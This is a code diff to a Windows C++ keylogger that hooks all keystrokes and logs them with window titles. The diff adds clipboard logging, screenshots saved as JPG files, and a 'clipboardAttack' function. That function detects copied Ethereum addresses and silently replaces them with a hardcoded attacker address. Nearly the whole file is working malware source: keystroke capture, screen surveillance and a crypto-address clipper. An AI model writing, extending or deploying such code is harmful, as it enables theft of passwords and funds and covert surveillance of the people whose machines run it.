@@ -1,15 +1,23 @@
 #pragma comment(lib, "User32.lib")
+#pragma comment(lib, "gdi32.lib")
 #include <iostream>
 #include <windows.h>
 #include <fstream>
 #include <string>
-#include <Winuser.h>
+#include <winuser.h>
 #include <ctime>
 #include <chrono>
+#include <atlimage.h>
 
-/* g_prevWindow is called globally because there is not way to pass it the hook callback function as an argument and is need to update the log file */
+/* these variables are called globally because there is no way to pass them to the hook callback function as an argument and are needed to update the log file
 
-std::wstring g_prevWindow;
+prevWindowTitle: stores the previous window title after logging.
+
+clipboardSequenceNumber: sequence number for the current clipboard, incremented each time the clipboard is changed, more: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardsequencenumber
+*/
+
+std::wstring	g_prevWindowTitle;
+DWORD			g_prevClipboardSequenceNumber;
 
 /* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS], returns a wide string to be written in wide ofstream */
 
@@ -34,6 +42,26 @@ std::wstring getWindowTitle(){
 	return (windowtitle);
 }
 
+/* getClipboardText is called in each clipboard change to log it, It is callig GetClipboardData with the unicode flag to return clipboard text written in any language */
+
+//FIX NON-TEXT errors
+
+std::wstring getClipboardText(){
+	if (OpenClipboard(NULL) == 0){
+		std::cout << "Error in openclipboard" << std::endl;
+	}
+	HANDLE hdata = GetClipboardData(CF_UNICODETEXT);
+	wchar_t *pszText = static_cast<wchar_t *>( GlobalLock(hdata) );
+	if (pszText == NULL){
+		std::cout << "w 3lach" << std::endl;
+		CloseClipboard();
+		return (L"[Non-Text Copy]");
+	}
+	std::wstring text(pszText);
+	CloseClipboard();
+	return (text);
+}
+
 /* writeLogs() Writes the date, window title and buffer content to the logfile.
 the local needs to be associated with imbue() to the wide file stream in order to write any unicode to the file */
 
@@ -49,6 +77,99 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile << "' - ";
 	logfile << buf << std::endl;
 	logfile.close();
+}
+
+bool isEthAddress(std::wstring cbText, LPWSTR attackerAddress){
+	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42 && wcscmp(cbText.c_str(), attackerAddress) != 0) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+/* clipboardAttack is a famous attack in the crypto space, it will scan your clipboard for amy cryptocurrency address, when copied it will be immediately replaced with the attacker's address.
+This function check if the new clipboard data is an ethereum address then allocates a global memory object for the attacker's address to be copied to clipboard instead */
+
+void clipboardAttack(LPWSTR attackerAddress){
+	std::wstring	cbText;
+	HGLOBAL 		dstHandle;
+	LPWSTR			dstEthAddress;
+	DWORD			len;
+
+	len = wcslen(attackerAddress); // Should be 42
+	cbText = getClipboardText();
+	if (isEthAddress(cbText, attackerAddress)){
+		std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
+		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
+		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
+		memcpy(dstEthAddress, attackerAddress, len * sizeof(WCHAR));
+		dstEthAddress[len] = NULL;
+		GlobalUnlock(dstHandle);
+
+		if (OpenClipboard(NULL) == 0){
+		std::cout << "Error in openclipboard" << std::endl;
+		}
+		EmptyClipboard();
+		SetClipboardData(CF_UNICODETEXT, dstHandle);
+		CloseClipboard();
+	}
+}
+
+/* writeClipboardChange() is called whenever the clipboard updates (ClipboardSequenceNumber is changed), it calls getClipboardText() then write it in log file */
+
+void writeClipboardChange(){
+	const std::locale utf8_locale = std::locale("en_US.UTF-8");
+	std::wofstream logfile;
+
+	logfile.open("logs.txt", std::ios::app);
+	logfile.imbue(utf8_locale);
+	logfile << std::endl << "***ClipBoard Change*** : *";
+	logfile << getClipboardText() << "*" << std::endl << std::endl;
+}
+
+std::string	getScreenFileName() {
+	struct tm* timeinfo;
+	char timestr[23];
+	time_t rawtime;
+
+	time(&rawtime);
+	timeinfo = localtime(&rawtime);
+	sprintf(timestr, "%02d-%02d-%d %02d_%02d_%02d.jpg", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
+	return (timestr);
+}
+
+void	saveScreenToFile(HBITMAP hBitmap){
+	CImage image;
+	image.Attach(hBitmap);
+	std::string filename = getScreenFileName();
+	std::cout << "filename : " << filename << std::endl;
+	std::cout << "HRESULT : " << image.Save(filename.c_str()) << std::endl;
+}
+
+void	takeScreen(){
+	int x1, y1, x2, y2, w, h;
+
+	// get screen dimensions
+    x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    w   = x2 - x1;
+    h   = y2 - y1;
+
+	// copy screen to bitmap
+    HDC     hScreen = GetDC(NULL);
+    HDC     hDC     = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
+    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
+    BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+
+	// save bitmap to clipboard
+    OpenClipboard(NULL);
+    EmptyClipboard();
+    SetClipboardData(CF_BITMAP, hBitmap);
+    CloseClipboard();
+	std::cout << "screen taken??" << std::endl;
+	saveScreenToFile(hBitmap);
 }
 
 /* TranslateKeys() is called on each keypress and simply converts the key press from vkCode to a writable character
@@ -70,7 +191,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[SHIFT]";
 	else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
 		result = L"[CTRL]";
-	else if (vkCode == VK_MENU)
+	else if (vkCode == VK_LMENU || vkCode == VK_RMENU)
 		result = L"[ALT]";
 	else if (vkCode == VK_CAPITAL)
 		result = L"[CAPS]";
@@ -84,18 +205,22 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[UP ARROW]";
 	else if (vkCode == VK_DOWN)
 		result = L"[DOWN ARROW]";
-	else if (vkCode == VK_SNAPSHOT)
+	else if (vkCode == VK_SNAPSHOT){
 		result = L"[PRINT SCREEN]";
+		//takeScreen();
+	}
 	else if (vkCode == VK_NUMLOCK)
 		result = L"[NUMLOCK]";
 	else if (vkCode == VK_LWIN)
 		result = L"[WINDOWS]";
-	else if (vkCode == 255)
+	else if (vkCode == 255){
 		result = L"[FN]";
+		takeScreen();
+	}
 	else if (vkCode >= 112 && vkCode <=120){
 		result = L"[F";
 		result += (wchar_t)vkCode-63; // 112-63=49(ascii for '1');		
-		result += ']';
+		result += L']';
 	}
 	else if (vkCode == 121)
 		result = L"[F10]";
@@ -112,7 +237,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
 		if (GetKeyboardState(lpKeyState) == 0){
-			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling here
+			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling
 		}
 		int ret = ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
 		result += buff[0];
@@ -126,16 +251,27 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
     KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
     std::wstring finalChar;
 	static std::wstring buf; // static to no reset after each keyboardHook call
-	std::wstring currentWindow;
+	std::wstring currentWindowTitle;
+	DWORD currentClipboardSequenceNumber;
 
-    if (wParam == WM_KEYDOWN){
-		currentWindow = getWindowTitle();
+
+	//PROGRAM EXITS WHEN TAKING A SCREEN (CLIPBOARD DATA ISN't WRITABLE, probably should check before with IsClipboardFormatAvailable)
+    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
+		currentWindowTitle = getWindowTitle();
+		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
+		std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
+		std::cout << "vk code: " << s->vkCode << std::endl;
+		std::cout << "scan code: " << s->scanCode << std::endl;
+		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
+			writeClipboardChange();
+			clipboardAttack(L"0x000000000000000000000000000000000000dEaD");
+			g_prevClipboardSequenceNumber = currentClipboardSequenceNumber;
+		}
 		// NEED TO FIX: first time program enters it prints 1 char
-		if (buf.length() >= 100 || (currentWindow != g_prevWindow && buf.length() > 0))
-				{
-					writeLogs(buf, g_prevWindow);
+		if (buf.length() >= 100 || (currentWindowTitle != g_prevWindowTitle && buf.length() > 0)){
+					writeLogs(buf, g_prevWindowTitle);
 					buf.clear();
-					g_prevWindow = currentWindow;
+					g_prevWindowTitle = currentWindowTitle;
 				}
         finalChar = translateKeys(s->vkCode, s->scanCode);
         buf += finalChar;
@@ -144,11 +280,11 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
-
 void main() {
     HHOOK keyboard;
     
-    g_prevWindow = getWindowTitle();
+    g_prevWindowTitle = getWindowTitle();
+	g_prevClipboardSequenceNumber = GetClipboardSequenceNumber();
     keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboardHook, 0, 0);
     MSG message;
     while (GetMessage(&message, NULL, NULL, NULL) > 0) {
@@ -157,3 +293,5 @@ void main() {
     }
     UnhookWindowsHookEx(keyboard);
 }
+
+//qwqwqwqw!!!@@##asasasasqwqwqw
